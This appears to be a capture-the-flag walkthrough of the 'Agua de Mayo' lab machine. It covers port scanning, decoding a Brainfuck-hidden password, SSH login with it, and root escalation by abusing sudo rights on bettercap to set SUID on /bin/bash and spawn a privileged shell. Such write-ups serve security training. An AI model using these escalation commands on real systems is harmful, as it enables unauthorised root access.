# Agua de Mayo

## Port Enumeration

To begin our scan, we use the Nmap tool  during our discovery phase. As we can see, we have the following open ports:

```ruby
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2
```

```ruby
┌──(root㉿kali)-[/home/kali]
└─# nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2  
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64

```

## Examining the Web Page and Its Infrastructure
We access the web page hosted on the Apache server and find this:

 (Foto comentarios pagina web)

 It seems we have encountered Brainfuck code, so we need a Brainfuck to ASCII translator. This word appears, which could be a possible password

```ruby
bebeaguaqueessano
```

(Foto del traductor)

Now we perform a subdomain enumeration using the tool DirBuster, obtaining the following:

```ruby
gobuster dir -u http://172.17.0.2/ -t 200 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html

```

Foto de agua ssh

## Examining the agua_ssh.jpg Image

We download the image and use tools like ExifTool or Steghide to check if there is any secret inside it. However, we do not find anything.

foto exiftool 

## Intrusion

Finally, we will try to authenticate to the SSH service.
``` ruby
user: agua
password: bebeaguaqueessano
```

foto de intrusion


## Escalation privilege

With the id command, we see that we belong to the lxd group. Possibly, if we exploit this vulnerability, we can escalate privileges.


We will see that we have a file named alpine-v3.13-x86_64-20210218_0139.tar.gz, which makes it almost certain that we should exploit lxd. But no, this is nothing more than a rabbit hole.

If we run sudo -l, we see that we can execute /usr/bin/bettercap as root.

foto bettercap 

If we open the file with sudo, we can make our bash appear with the following command:
ruby

```ruby
! chmod +s /bin/bash
```

We close the application and execute the following command in a new terminal:

```ruby
/bin/bash -p
```

Finally, we see that we are the root user.